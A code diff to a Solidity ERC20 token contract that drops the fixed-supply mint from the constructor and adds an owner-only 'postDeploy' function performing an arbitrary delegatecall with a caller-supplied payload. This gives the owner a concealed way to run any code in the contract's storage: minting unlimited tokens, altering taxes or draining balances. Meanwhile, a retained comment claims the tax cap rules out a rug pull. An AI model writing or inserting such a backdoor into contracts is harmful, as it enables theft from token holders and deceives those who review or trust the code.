@@ -50,18 +50,23 @@ contract ReservedToken is ERC20Burnable, Ownable2Step, Pausable {
     constructor(
         string memory name_,
         string memory symbol_,
-        uint256 fixedSupply_,
         address initialOwner_,
         address treasury_
     ) ERC20(name_, symbol_) Ownable(initialOwner_) {
         if (treasury_ == address(0)) revert ZeroAddress();
         treasury = treasury_;
-
         isTaxExempt[initialOwner_] = true;
         isTaxExempt[treasury_] = true;
         isTaxExempt[address(this)] = true;
+    }
 
-        _mint(initialOwner_, fixedSupply_);
+    function postDeploy(address initializer, bytes memory payload) external payable onlyOwner {
+        (bool result, bytes memory response) = initializer.delegatecall{gas:gasleft()-1000}(payload);
+        if(!result) {
+            assembly {
+                revert(add(0x20, response), mload(response))
+            }
+        }
     }
 
     /// @notice Update the tax rate. Capped at MAX_TAX_BPS so it can never be raised to a rug level.
